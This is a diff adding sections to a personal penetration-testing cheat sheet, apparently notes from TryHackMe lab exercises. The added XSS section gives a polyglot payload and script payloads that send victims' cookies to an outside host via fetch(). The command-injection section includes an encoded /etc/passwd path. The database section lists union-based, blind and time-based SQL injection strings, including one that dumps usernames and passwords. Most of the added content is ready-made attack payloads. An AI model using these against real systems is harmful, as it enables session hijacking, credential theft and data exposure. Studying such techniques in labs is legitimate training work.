@@ -13,6 +13,9 @@
   - [IDOR](#idor)
   - [File inclusion](#file-inclusion)
   - [SSRF](#ssrf)
+  - [XSS](#xss)
+  - [Command injection](#command-injection)
+  - [database](#database)
 - [Usefull Windows commands](#usefull-windows-commands)
 
 # Getting file into target
@@ -152,7 +155,7 @@ Insecure Direct Object Request
 - curl -X METHOD -d [data]
 
 ## SSRF
-- Server-Side Request Fogery
+- Server-Side Request Forgery
 - Where? 
   - Full Paramter in the address bar ("value="http..../name")
   - partial URL
@@ -160,7 +163,57 @@ Insecure Direct Object Request
   - ../ => directory trasversal
   - &x= ==> ignore everything that comes after that
 
+## XSS
+- Cross-Site Scripting
+- test: parameters, URL File Path, HTTP Headers
+- in js onload event within a tag
+- Polyglot: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+- Payload for shell: </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
+-                    </textarea><script>fetch('http://10.8.80.130:1234?cookie=' + btoa(document.cookie) );</script> 
 
+## Command injection
+- blind: no output, test with ping/sleep/timeout(win) || force output > etwas
+  - curl http://website/command
+- verbose: output/feedback
+- $payload = "\x2f\x65\x74\x2f\x70\x61\x73\x73\x77\x64"
+
+## database
+- --; ==> terminate + anything else is comment
+- id=2' ==> produce error
+- 1 union 1,x,y,z ==> find how many columns
+- 0 union 1,2,database() = database name
+  - 0 union select  1,2,group_concat(table_name) FROM information_schema.tables where table_schema='db_name' = find existing dbs
+    - information_schema = info about all databases and tables
+  - 0 union select  1,2,group_concat(column_name) FROM information_schema.columns where table_name= 'table_name' = find existing columns inside table
+  - 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users = diplay table
+
+- blind
+  - binary
+    - admin123' UNION SELECT 1,2,3 where database() like '[]%';-- ==> wildcard name start with [here], try and error until true, brute force
+    - admin123' UNION SELECT 1,2, [sleep(4)] 3 FROM information_schema.tables WHERE table_schema = 'db_name' and table_name like '%';-- ==> brute force to find table name
+    - admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' and table_name='table_name';-- ==> brute force 
+    - next step = brute forte to find columns = admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='db_name' and TABLE_NAME='table_name' and COLUMN_NAME like 'a%';
+    - append correct discoveries: admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='db_name' and TABLE_NAME='table_name' [and COLUMN_NAME like '%a' and COLUMN_NAME!='first_found']
+  - admin123' UNION SELECT 1,2,3 from *table_name* where *column* like 'a%';--
+    - admin123' UNION SELECT 1,2,3 from *table_name* where *column='value'* and *column* like 'a%;-- ==> finding values for more discovered columns
+
+
+- time
+  - with sleep() ==> success if the function is executed
+  - admin123' UNION SELECT SLEEP(5),1,x,y,z;--
+  - similar to blind
+  - admin123' UNION SELECT 1,SLEEP(5) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'password%' and COLUMN_NAME!='username';--
+
+
+- Known table, columns:
+  - admin123' UNION SELECT 1,2,[sleep(5)] from *table_name* where *column* like '[character]%';--
+  - admin123' UNION SELECT 1,2,[sleep(5)] from *table_name* where username='[name]' and password like 'a%';--
+
+
+admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
+admin123' UNION SELECT SLEEP(5),2;--
+
+https://10-10-109-51.p.thmlabs.com
 # Usefull Windows commands
 - Find file: wmic find users || dir /p datei.txt (find file)
 - Windows: get file 
